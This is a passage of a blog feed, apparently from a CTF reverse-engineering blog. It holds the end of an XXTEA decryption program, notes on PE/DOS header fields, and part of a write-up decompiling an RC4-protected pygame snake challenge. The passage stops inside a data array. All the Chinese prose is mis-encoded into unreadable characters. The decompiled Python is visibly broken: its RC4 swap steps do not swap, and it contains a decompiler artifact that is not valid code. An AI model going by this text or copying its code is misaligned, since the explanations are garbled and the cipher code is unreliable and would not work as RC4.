&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">9</span>]= &#123;<span class="number">0x38FA8A82</span>, <span class="number">0x0D7501380</span>, <span class="number">0x0E40969D</span>, <span class="number">0x4E169120</span>, <span class="number">0x713A29AB</span>, <span class="number">0x6CE5393D</span>, <span class="number">0x0B69D752E</span>, <span class="number">0x841A88E6</span>, <span class="number">0x6F31B459</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">0x19</span>,<span class="number">0x19</span>,<span class="number">0x08</span>,<span class="number">0x10</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n= <span class="number">9</span>;</span><br><span class="line">   <span class="comment">// btea(v, n, k); //é”çŠ²ç˜‘</span></span><br><span class="line">   <span class="comment">//printf(&quot;0x%0x&quot;,k[3]);</span></span><br><span class="line">    <span class="built_in">btea</span>(v, -n, k);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,v);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å¤§ä½¬ä»¬æ–‡ç« ä¸è§†é¢‘ï¼Œå»çœ‹çœ‹æœ‰åŠ©äºç†è§£"><a href="#å¤§ä½¬ä»¬æ–‡ç« ä¸è§†é¢‘ï¼Œå»çœ‹çœ‹æœ‰åŠ©äºç†è§£" class="headerlink" title="å¤§ä½¬ä»¬æ–‡ç« ä¸è§†é¢‘ï¼Œå»çœ‹çœ‹æœ‰åŠ©äºç†è§£"></a>å¤§ä½¬ä»¬æ–‡ç« ä¸è§†é¢‘ï¼Œå»çœ‹çœ‹æœ‰åŠ©äºç†è§£</h1><p>csdnï¼šï¼ˆè¿™ä¸¤æˆ‘å»ºè®®é…ç€çœ‹ï¼‰</p><p>1.<a href="https://blog.csdn.net/m0_73393932/article/details/130094306?ops_request_misc=&request_id=&biz_id=102&utm_term=tea%E7%AE%97%E6%B3%95&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-130094306.142">https://blog.csdn.net/m0_73393932/article/details/130094306?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=tea%E7%AE%97%E6%B3%95&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-130094306.142</a></p><p>2.<a href="https://blog.csdn.net/xiao__1bai/article/details/123307059">https://blog.csdn.net/xiao__1bai/article/details/123307059</a></p><p>b ç«™ï¼š(ç¬¬ä¸€ä¸ªè§†é¢‘æ²¡æœ‰æ›´æ–°åˆ° xxtea çš„åŠ¨ç”»æ¼”ç¤ºç†è§£ï¼Œç¬¬äºŒä¸ª up éº¦æ¯”è¾ƒç‚¸)<br>ã€ã€åŠ¨ç”»å¯†ç å­¦ã€‘TEA(Tiny Encryption Algorithm)|åˆ†ç»„åŠ å¯†ã€‘ <a href="https://www.bilibili.com/video/BV1Nu411E7wX/?share_source=copy_web&vd_source=86d6e63e560e68bb720088caa831e036">https://www.bilibili.com/video/BV1Nu411E7wX/?share_source=copy_web&amp;vd_source=86d6e63e560e68bb720088caa831e036</a></p><p>ã€VTuber æ·±å…¥æµ…å‡ºåº”ç”¨å¯†ç å­¦ 7-2-1 XTEA ç®—æ³• C++ä»£ç  å¯¹ç§°å¯†ç  å—å¯†ç  åˆ†ç»„å¯†ç  ä¿¡æ¯å®‰å…¨ã€‘ <a href="https://www.bilibili.com/video/BV1zF411U7ap/?share_source=copy_web&vd_source=86d6e63e560e68bb720088caa831e036">https://www.bilibili.com/video/BV1zF411U7ap/?share_source=copy_web&amp;vd_source=86d6e63e560e68bb720088caa831e036</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€PEã€‘DOSå¤´-PEå¤´-èŠ‚è¡¨å±æ€§è¯´æ˜</title>
      <link href="/2024/07/11/dos-pe-%E8%8A%82%E8%A1%A8%E5%B1%9E%E6%80%A7/"/>
      <url>/2024/07/11/dos-pe-%E8%8A%82%E8%A1%A8%E5%B1%9E%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="DOSå¤´-PEå¤´-èŠ‚è¡¨å±æ€§è¯´æ˜"><a href="#DOSå¤´-PEå¤´-èŠ‚è¡¨å±æ€§è¯´æ˜" class="headerlink" title="DOSå¤´-PEå¤´-èŠ‚è¡¨å±æ€§è¯´æ˜"></a>DOSå¤´-PEå¤´-èŠ‚è¡¨å±æ€§è¯´æ˜</h1><h2 id="DOSå¤´"><a href="#DOSå¤´" class="headerlink" title="DOSå¤´"></a>DOSå¤´</h2><p>doså¤´ç”±DOS-MZæ–‡ä»¶å¤´å’ŒDOSå—ç»„æˆ</p><h4 id="DOS-MZæ–‡ä»¶å¤´"><a href="#DOS-MZæ–‡ä»¶å¤´" class="headerlink" title="DOS-MZæ–‡ä»¶å¤´"></a>DOS-MZæ–‡ä»¶å¤´</h4><p>ï¼ˆä¸‹å›¾æ˜¯16ä½ç¨‹åºçš„è¡¨ï¼Œç°åœ¨å·²ç»ä¸ç”¨è¿™ä¸ªç»“æ„ä½“ï¼‰</p><p>&#x3D;&#x3D;<strong>ï¼ï¼ï¼çº¢è‰²ç»“æ„ä½“æˆå‘˜ä»åœ¨ä½¿ç”¨ï¼ï¼ï¼</strong>&#x3D;&#x3D;</p><p><strong>ä¸­é—´é»‘è‰²æˆå‘˜éƒ¨åˆ†å¯ä»¥éšæ„æ”¹åŠ¨ä¸å½±å“ç¨‹åºçš„è¿è¡Œ</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/DOS-MZ%E7%BB%93%E6%9E%84%E4%BD%93.png" alt="DOS-MZç»“æ„ä½“"></p><p><strong>æœ€åçš„ç»“æ„ä½“æ˜¯è®¡ç®—æœºæŸ¥æ‰¾peå¤´æ‰€åœ¨çš„åœ°å€å› æ­¤ä¹Ÿä¸èƒ½éšæ„æ›´æ”¹</strong></p><h4 id="DOSå—"><a href="#DOSå—" class="headerlink" title="DOSå—"></a>DOSå—</h4><p>å¤„äºDOS-MZå¤´ä¸æ ‡å‡†PEå¤´çš„ä¸­é—´ï¼Œä¸€èˆ¬ç”±è¿æ¥å™¨å¡«å……ï¼Œå¯ä»¥å¹²äº›çŒ¥çäº‹æƒ…</p><p><strong>è¿™å—æ•°æ®å¯ä»¥éšæ„æ›´æ”¹ä¸å½±å“ç¨‹åºè¿è¡Œ</strong></p><h2 id="PEæ–‡ä»¶å¤´"><a href="#PEæ–‡ä»¶å¤´" class="headerlink" title="PEæ–‡ä»¶å¤´"></a>PEæ–‡ä»¶å¤´</h2><p>ä¸‹å›¾æ˜¯peç»“æ„ä½“</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/pe%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt="peå¤´ç»“æ„ä½“"></p><p>ä¸€ä¸ªç¨‹åºçš„ä¸»è¦é‡è¦æ•°æ®å…¨åœ¨æ ‡å‡†PEå¤´å’Œæ‰©å±•PEå¤´ä¸­</p><h4 id="PEæ ‡è¯†"><a href="#PEæ ‡è¯†" class="headerlink" title="PEæ ‡è¯†"></a>PEæ ‡è¯†</h4><p>å ç”¨4å­—èŠ‚</p><p>PEæ ‡è¯†<strong>ä¸èƒ½æ›´æ”¹</strong>ï¼Œç¨‹åºä¼šæ£€æµ‹PEæ ‡è¯†æ˜¯å¦æ˜¯æ­£ç¡®çš„å€¼</p><h4 id="æ ‡å‡†PEå¤´"><a href="#æ ‡å‡†PEå¤´" class="headerlink" title="æ ‡å‡†PEå¤´"></a>æ ‡å‡†PEå¤´</h4><p>å ç”¨20ä¸ªå­—èŠ‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/%E6%A0%87%E5%87%86PE%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt="æ ‡å‡†PEå¤´ç»“æ„ä½“"></p><p><strong>Machine</strong>æ ‡è¯†å½“å‰è¿™ä¸ªç¨‹åºè¿è¡Œåœ¨ä»€ä¹ˆæ ·çš„cpuå‹å·ä¸Š</p><p><strong>NumberOfSections</strong>è®°å½•å½“å‰çš„PEæ–‡ä»¶æœ‰å¤šå°‘ä¸ªèŠ‚</p><p><strong>TImeDataStamp</strong>æ˜¯ä»1970å¹´0æ—¶0åˆ†0ç§’å¼€å§‹åˆ°ç¼–è¯‘å™¨ç¼–è¯‘å½“å‰ç¨‹åºçš„æ—¶å€™</p><p>PointerToSymbolTableï¼ŒNumberOfSymbolsä¸è°ƒè¯•ç›¸å…³</p><p><strong>SizeOfOptionalHeader</strong>æ‰©å±•PEå¤´çš„å¤§å°ï¼Œé»˜è®¤æƒ…å†µ32ä½æ˜¯0xE0ï¼Œ64ä½æ˜¯0xf0</p><p><strong>Characteristics</strong>è¡¨ç¤ºæ–‡ä»¶å±æ€§ï¼Œè¦æŠŠè¯¥ä½çš„16è¿›åˆ¶è½¬æ¢æˆ2è¿›åˆ¶ï¼Œè½¬æ¢æˆçš„äºŒè¿›åˆ¶æ¯ä¸€ä½éƒ½æœ‰å…¶å«ä¹‰</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/characteristics%E5%90%AB%E4%B9%89%E8%A1%A8.png" alt="characteristicså«ä¹‰è¡¨"></p><p>å“ªä½ä¸º1ï¼Œå“ªä½å°±æœ‰ç›¸åº”å«ä¹‰ï¼Œ</p><p><strong>ä½æ•°æ˜¯ä»é›¶å¼€å§‹ã€‚ä»å³å‘å·¦ä½æ•°é€’å¢</strong></p><p>ä¾‹å¦‚0x0026è½¬æ¢æˆäºŒè¿›åˆ¶æ˜¯0000 0000 0010 0110</p><p>å…¶å«ä¹‰æ˜¯æ–‡ä»¶æ˜¯å¯æ‰§è¡Œçš„ï¼›ä¸å­˜åœ¨è¡Œä¿¡æ¯ï¼›åº”ç”¨ç¨‹åºå¯å¤„ç†å¤§äº2GBçš„åœ°å€</p><h4 id="æ‰©å±•PEå¤´"><a href="#æ‰©å±•PEå¤´" class="headerlink" title="æ‰©å±•PEå¤´"></a>æ‰©å±•PEå¤´</h4><p>å ç”¨224ä¸ªå­—èŠ‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/%E6%89%A9%E5%B1%95PE%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93-32-02.png" alt="æ‰©å±•peå¤´ç»“æ„ä½“"></p><p>32ä½å’Œ64ä½çš„ç»“æ„ä½“ä¸­æœ€åä¸€ä¸ªå­ç»“æ„ä½“ä¼šä¸åŒï¼Œ</p><p>64ä½ä¼šæ¯”32ä½å°‘å‡ ä¸ªæˆå‘˜ï¼Œè¿˜æœ‰éƒ¨åˆ†æˆå‘˜å˜æˆ85å­—èŠ‚</p><p>å…ˆä»¥32ä½ç»“æ„ä½“ä½åŸºå‡†</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/%E6%89%A9%E5%B1%95PE%E5%A4%B4-32%E7%BB%93%E6%9E%84%E4%BD%93.png" alt="æ‰©å±•PEå¤´-32ç»“æ„ä½“"></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/%E6%89%A9%E5%B1%95PE%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93-32-02.png" alt="æ‰©å±•PEå¤´ç»“æ„ä½“-32-02"></p><p>ä¸»è¦ç ”ç©¶çº¢è‰²çš„éƒ¨åˆ†</p><p><strong>Magic</strong>æ˜¯ç”¨æ¥æ ‡è¯†å½“å‰ç¨‹åºæ˜¯32&#x2F;64ä½ï¼Œè½¬æ¢æˆä¸¤å­—èŠ‚å <strong>10Bæ˜¯æ ‡è¯†32ä½ï¼Œ20Bæ˜¯æ ‡è¯†64ä½</strong></p><p>BYTE MajorLinkerVersion,BYTE MinorLinkerVersionï¼Œå­˜å‚¨é“¾æ¥å™¨çš„ç‰ˆæœ¬ï¼Œç”±é“¾æ¥å™¨å¡«å†™ï¼Œä¸å½±å“ç¨‹åºè¿è¡Œ</p><p>DWORD SizeOfCodeï¼ŒDWORDSizeOfnitializedDataï¼ŒDWORDSizeO fUninitialize dDataç”±ç¼–è¯‘å™¨å¡«å†™ï¼Œä¸å½±å“ç¨‹åºè¿è¡Œ</p><p>&#x3D;&#x3D;<strong>Addre ssOEntrvPoint</strong>&#x3D;&#x3D;æ˜¯ç¨‹åºå…¥å£ï¼Œæ˜¯**&#x3D;&#x3D;å½“å‰è¿™ä¸ªç¨‹åºåœ¨å“ªé‡Œå¼€å§‹æ‰§è¡Œçš„&#x3D;&#x3D;**ï¼Œè¦é…åˆlmageBaseï¼ˆå†…å­˜é•œåƒåŸºå€ï¼‰æ¥çœ‹</p><p>&#x3D;&#x3D;<strong>lmageBase</strong>&#x3D;&#x3D;æ˜¯å†…å­˜é•œåƒåŸºå€ï¼Œç”±å®ƒå†³å®š&#x3D;&#x3D;<strong>ç¨‹åºåœ¨å†…å­˜æ‰§è¡Œçš„æ—¶å€™åœ¨å“ªä¸ªåœ°å€å±•å¼€</strong>&#x3D;&#x3D;</p><p><strong>&#x3D;&#x3D;ï¼ˆï¼ï¼ï¼å±•å¼€ä¸æ˜¯æ‰§è¡Œï¼ï¼ï¼ï¼‰&#x3D;&#x3D;</strong></p><p>å®é™…çš„ç¨‹åºåœ¨å†…å­˜çš„å…¥å£æ˜¯&#x3D;&#x3D;<strong>lmageBase</strong>&#x3D;&#x3D; <strong>+</strong> &#x3D;&#x3D;<strong>Addre ssOEntrvPoint</strong>&#x3D;&#x3D;</p><p><strong>SectionAlignment. å†…å­˜å¯¹é½ï¼ˆçœ‹ä¸Šä¸ªç¬”è®°æŠŠï¼‰</strong><br><strong>FileAlignmentæ–‡ä»¶å¯¹é½ï¼ˆçœ‹ä¸Šä¸ªç¬”è®°æŠŠï¼‰</strong></p><p>MajorOperatingSystemVersion:æ ‡è¯†æŸä½œç³»ç»Ÿç‰ˆæœ¬å· ä¸»ç‰ˆæœ¬å·</p><p>MinorOperatingSyste mVersion;æ ‡è¯†æŸä½œç³»ç»Ÿç‰ˆæœ¬å· æ¬¡ç‰ˆæœ¬å·</p><p>MajorlmageVersion.PEæ–‡ä»¶è‡ªèº«çš„ç‰ˆæœ¬å·</p><p>MinorlmageVersionPEæ–‡ä»¶è‡ªèº«çš„è´¨æœ¬å·</p><p>MajorSubsystemVersionè¿è¡Œæ‰€éœ€å­ç³»ç»Ÿç‰ˆæœ¬å·</p><p>MinorSubsystemVersion:è¿è¡Œæ‰€éœ€å­ç³»ç»Ÿç‰ˆæœ¬å·</p><p>Win32VersionValue;å­ç³»ç»Ÿè´¨æœ¬çš„å€¼ï¼Œå¿…é¡»ä¸º0</p><p><strong>SizeOfimage.<strong>å†…å­˜ä¸­æ•´ä¸ªPEæ–‡ä»¶å±•å¼€çš„å°ºå¯¸ï¼Œå¯æ¯”å®é™…çš„å€¼å¤§ï¼Œå¿…é¡»æ˜¯</strong>SectionAlignmentæ•´æ•°å€</strong><br><strong>SizeOfHeaders</strong>æ‰€æœ‰å¤´+èŠ‚è¡¨æŒ‰ç…§æ–‡ä»¶å¯¹é½åçš„å¤§å°ï¼Œå¦åˆ™åŠ è½½ä¼šå‡ºé”™å¿…é¡»æ˜¯<strong>FileAlignmentæ•´æ•°å€</strong><br><strong>CheckSumï¼ˆæ ¡éªŒç›’ï¼‰</strong>æ ¡éªŒå’Œä¸€äº›ç³»ç»Ÿæ–‡ä»¶æœ‰è¦æ±‚,ç”¨æ¥ åˆ¤æ–­æ–‡ä»¶æ˜¯å¦è¢«ä¿®æ”¹ï¼Œä¸¤ä¸ªå­—èŠ‚ä¸¤ä¸ªå­—èŠ‚ç›¸åŠ ï¼Œæº¢å‡ºä¸ç”¨åœ¨æ„ï¼Œæœ€ååŠ ä¸Šæ–‡ä»¶é•¿åº¦</p><p>Subsystemå­ç³»ç»Ÿé©±åŠ¨ç¨‹åº(1) å›¾å½¢ç•Œé¢(2) æ§åˆ¶å°ã€DLL(3)<br>DllCharacteristicsæ–‡ä»¶ç‰¹æ€§ ä¸æ˜¯é’ˆå¯¹DLLæ–‡ä»¶çš„ï¼Œæ˜¯<strong>æè¿°æ–‡ä»¶å±æ€§</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/DilCharacteristics.png" alt="DilCharacteristics"></p><p>æŸ¥æ‰¾æ–¹å¼ä¸ä¸Šé¢æ ‡å‡†PEå¤´çš„ä¸€æ ·å°†16è¿›åˆ¶è½¬æ¢æˆ2è¿›åˆ¶ï¼Œ2è¿›åˆ¶çš„æ¯ä¸€ä½éƒ½æœ‰å„è‡ªçš„å«ä¹‰</p><p>SizeOfStackReserveåˆå§‹åŒ–æ—¶ä¿ç•™çš„æ ˆå¤§å°<br>SizeOfStackCommitåˆå§‹åŒ–æ—¶å®é™…æäº¤çš„å¤§å°<br>SizeOHeapReserve å§‹åŒ–æ—¶ä¿ç•™çš„é›„å¤§å°<br>SizeOfHeapCommitåˆå§‹åŒ–æ—¶å®è·µæäº¤çš„å¤§å°<br>LoaderFlags  è°ƒè¯•ç›¸å…³<br>NumberOfRvaAndSizes  ç›®å½•é¡¹æ•°ç›®</p><p>IMAGE DATA DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTERIES]</p><p>è¿™æ˜¯ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œé•¿åº¦æ˜¯16ä¸ªå­—èŠ‚ï¼Œæœ‰4ä¸ªDWORDçš„æˆå‘˜</p><h2 id="èŠ‚è¡¨"><a href="#èŠ‚è¡¨" class="headerlink" title="èŠ‚è¡¨"></a>èŠ‚è¡¨</h2><p>æ¯ä¸ªèŠ‚æœ‰40ä¸ªå­—èŠ‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/%E8%8A%82%E8%A1%A8%E7%BB%93%E6%9E%84%E8%AF%B4%E6%98%8E.png" alt="èŠ‚è¡¨ç»“æ„è¯´æ˜"></p><p>BYTE NamelIMAGE SIZEOF SHORT_NAME]8å­—èŠ‚ï¼Œå½“å‰èŠ‚çš„åå­—ï¼Œå¯æ›´æ”¹ï¼Œä¸å½±å“ç¨‹åºçš„è¿è¡Œ</p><p> <strong>VrtualSize</strong>å½“å‰è¿™ä¸ªèŠ‚ä¸­<strong>æ²¡æœ‰å¯¹é½</strong>åçš„å€¼ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯å½“å‰èŠ‚<strong>çœŸå®çš„å€¼</strong>æ˜¯å¤šå°‘</p><p> <strong>VirtualAddress</strong><strong>åœ¨å†…å­˜ä¸­çš„åç§»åœ°å€,åŠ ä¸ŠImageBaseæ‰æ˜¯åœ¨å†…å­˜ä¸­çš„çœŸæ­£åœ°å€</strong><br><strong>SizeOfRawData</strong>èŠ‚åœ¨<strong>æ–‡ä»¶ä¸­</strong>å¯¹é½åçš„å°ºå¯¸<br><strong>PointerToRawData</strong>èŠ‚åŒºåœ¨<strong>æ–‡ä»¶</strong>ä¸­çš„åç§»</p><p>å½“æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†<strong>åˆå§‹åŒ–äº†çš„å…¨å±€å˜é‡</strong>ï¼Œ &#x3D;&#x3D;<strong>VrtualSize</strong>å€¼ä¸€å®šå°äº<strong>SizeOfRawData</strong>&#x3D;&#x3D;</p><p>å½“æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†<strong>æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡</strong>ï¼Œåœ¨<strong>æ–‡ä»¶ä¸­ä¸ç»™å˜é‡åˆ†é…ç©ºé—´</strong>ï¼Œä½†æ˜¯å±•å¼€åˆ°å†…å­˜ä¸­æ—¶è¦ç»™æœªåˆå§‹åŒ–çš„å˜é‡åˆå§‹åŒ–ï¼Œ&#x3D;&#x3D;<strong>VrtualSize</strong>ä¼šæ¯”<strong>SizeOfRawData</strong>å¤§&#x3D;&#x3D;</p><p>è¿™æ ·ä¼šè®©å†…å­˜å¾ˆéš¾åŠï¼Œäºæ˜¯å†…å­˜æƒ³**&#x3D;&#x3D;è°å¤§æŒ‰ç…§è°å±•å¼€&#x3D;&#x3D;**</p><p><strong>Characteristics</strong>èŠ‚çš„å±æ€§</p><p>æŠŠ4å­—èŠ‚çš„16è¿›åˆ¶è½¬æ¢æˆ2è¿›åˆ¶åæŒ‰ç…§å¯¹åº”çš„ä½ç½®æ¥æŸ¥æ‰¾ç›¸å…³ä¿¡æ¯</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/%E8%8A%82%E8%A1%A8%E5%B1%9E%E6%80%A7%E8%A1%A8.png" alt="èŠ‚è¡¨å±æ€§è¡¨"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€RC4ã€‘ã€2024summerã€‘Snack.exeï¼ˆver.é¸¿è¾‰ï¼‰</title>
      <link href="/2024/07/10/snack.exe/"/>
      <url>/2024/07/10/snack.exe/</url>
      
        <content type="html"><![CDATA[<h1 id="snack-exe"><a href="#snack-exe" class="headerlink" title="snack.exe"></a>snack.exe</h1><hr><h3 id="ï¼ï¼ï¼rc4çš„åŠ è§£å¯†ç®—æ³•ç›¸åŒï¼ï¼ï¼"><a href="#ï¼ï¼ï¼rc4çš„åŠ è§£å¯†ç®—æ³•ç›¸åŒï¼ï¼ï¼" class="headerlink" title="ï¼ï¼ï¼rc4çš„åŠ è§£å¯†ç®—æ³•ç›¸åŒï¼ï¼ï¼"></a>ï¼ï¼ï¼rc4çš„åŠ è§£å¯†ç®—æ³•ç›¸åŒï¼ï¼ï¼</h3><hr><p>æŸ¥å£³æ— å£³ï¼Œç”¨idaæŸ¥çœ‹stringå‘ç°æœ‰å­—ç¬¦</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/snack01.png" alt="snack01"></p><p>è¯´æ˜æ˜¯ç”¨pythonå†™å®Œæ‰“åŒ…çš„ç¨‹åº</p><p>ä½¿ç”¨pyinstxtractorå’Œuncompyle6è¿›è¡Œè§£åŒ…å’Œåç¼–è¯‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_stream</span>(<span class="params">S, length</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_stream = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = S[i]</span><br><span class="line">        key_stream.append(S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> key_stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    S = initialize(key)</span><br><span class="line">    key_stream = generate_key_stream(S, <span class="built_in">len</span>(data))</span><br><span class="line">    decrypted_data = <span class="literal">None</span>((<span class="keyword">lambda</span> <span class="number">.0</span> = <span class="literal">None</span>: [ i ^ data[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">.0</span> ])(<span class="built_in">range</span>(<span class="built_in">len</span>(data))))</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line">pygame.init()</span><br><span class="line">WINDOW_WIDTH = <span class="number">800</span></span><br><span class="line">WINDOW_HEIGHT = <span class="number">600</span></span><br><span class="line">SNAKE_SIZE = <span class="number">20</span></span><br><span class="line">SNAKE_SPEED = <span class="number">20</span></span><br><span class="line">WHITE = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">BLACK = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">RED = (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">window = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))</span><br><span class="line">pygame.display.set_caption(<span class="string">&#x27;è´ªåƒè›‡&#x27;</span>)</span><br><span class="line">font = pygame.font.Font(<span class="literal">None</span>, <span class="number">36</span>)</span><br><span class="line">snake = [</span><br><span class="line">    (<span class="number">200</span>, <span class="number">200</span>),</span><br><span class="line">    (<span class="number">210</span>, <span class="number">200</span>),</span><br><span class="line">    (<span class="number">220</span>, <span class="number">200</span>)]</span><br><span class="line">snake_direction = (SNAKE_SPEED, <span class="number">0</span>)</span><br><span class="line">food = ((random.randint(<span class="number">0</span>, WINDOW_WIDTH - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE, (random.randint(<span class="number">0</span>, WINDOW_HEIGHT - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE)</span><br><span class="line">key_bytes = <span class="built_in">bytes</span>((<span class="keyword">lambda</span> <span class="number">.0</span>: [ <span class="built_in">ord</span>(char) <span class="keyword">for</span> char <span class="keyword">in</span> <span class="number">.0</span> ])(key.xor_key))</span><br><span class="line">data = [</span><br><span class="line">    <span class="number">101</span>,<span class="number">97</span>,<span class="number">39</span>,<span class="number">125</span>,<span class="number">218</span>,</span><br><span class="line">    <span class="number">172</span>,<span class="number">205</span>,<span class="number">3</span>,<span class="number">235</span>,<span class="number">195</span>,</span><br><span class="line">    <span class="number">72</span>,<span class="number">125</span>,<span class="number">89</span>, <span class="number">130</span>,<span class="number">103</span>,</span><br><span class="line">    <span class="number">213</span>,<span class="number">120</span>,<span class="number">227</span>,<span class="number">193</span>,<span class="number">67</span>,</span><br><span class="line">    <span class="number">174</span>,<span class="number">71</span>,<span class="number">162</span>,<span class="number">248</span>,<span class="number">244</span>,</span><br><span class="line">    <span class="number">12</span>,<span class="number">238</span>,<span class="number">92</span>,<span class="number">160</span>,<span class="number">203</span>,<span class="number">185</span>,<span 